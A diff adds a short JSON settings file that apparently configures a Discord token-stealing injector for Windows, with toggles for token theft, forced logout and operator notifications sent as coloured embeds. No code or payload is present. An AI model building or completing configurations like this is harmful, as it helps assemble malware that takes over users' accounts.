@@ -1,0 +1,9 @@
+{
+    "platform": ["windows"],
+    "logout": "instant",
+    "steal-token": "false",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify":"true",
+    "embed-color": "3447704"
+}
